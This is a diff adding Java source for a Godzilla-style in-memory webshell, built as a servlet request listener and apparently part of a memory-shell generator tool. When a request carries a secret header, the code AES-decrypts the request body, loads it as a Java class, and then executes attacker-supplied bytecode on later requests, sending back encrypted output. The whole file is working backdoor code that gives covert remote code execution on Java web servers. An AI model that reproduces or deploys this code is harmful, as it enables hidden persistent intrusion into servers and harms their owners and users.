@@ -1,0 +1,122 @@
+package com.reajason.javaweb.memshell.shelltool.godzilla.hw;
+
+import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
+import java.io.PrintWriter;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+/**
+ * Godzilla HW Listener 模板（JAVA_AES_RAW）。
+ * <p>
+ * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
+ * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
+ *
+ * @author ReaJason
+ */
+public class GodzillaHwListenerRaw extends ClassLoader implements ServletRequestListener {
+    private static String key;
+    private static String headerName;
+    private static String headerValue;
+    private static Class<?> payload;
+
+
+    public GodzillaHwListenerRaw() {
+    }
+
+    public GodzillaHwListenerRaw(ClassLoader parent) {
+        super(parent);
+    }
+
+    @Override
+    @SuppressWarnings("all")
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
+        try {
+            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
+                run(request, response);
+            }
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    private Object getResponseFromRequest(Object request) throws Exception {
+        return null;
+    }
+
+    @SuppressWarnings("all")
+    private boolean run(Object request, Object response) throws Exception {
+        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        if (value == null || !value.contains(headerValue)) {
+            return false;
+        }
+        byte[] data = x(readBody(request), false);
+        if (payload == null) {
+            payload = this.defineClass(data, 0, data.length);
+            return true;
+        }
+        java.io.OutputStream outputStream = (java.io.OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
+        try {
+            outputStream.write(x(execute(request, data), true));
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+        outputStream.flush();
+        outputStream.close();
+        return true;
+    }
+
+    @SuppressWarnings("all")
+    private static byte[] execute(Object request, byte[] data) throws Exception {
+        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+        Object f = payload.newInstance();
+        f.equals(arrOut);
+        f.equals(request);
+        f.equals(data);
+        f.toString();
+        return arrOut.toByteArray();
+    }
+
+    @SuppressWarnings("all")
+    private static byte[] readBody(Object request) throws Exception {
+        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
+        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+        byte[] buffer = new byte[8192];
+        int read;
+        while ((read = inputStream.read(buffer)) > 0) {
+            outputStream.write(buffer, 0, read);
+        }
+        return outputStream.toByteArray();
+    }
+    @SuppressWarnings("all")
+    public byte[] x(byte[] s, boolean m) throws Exception {
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
+        return cipher.doFinal(s);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+    }
+}
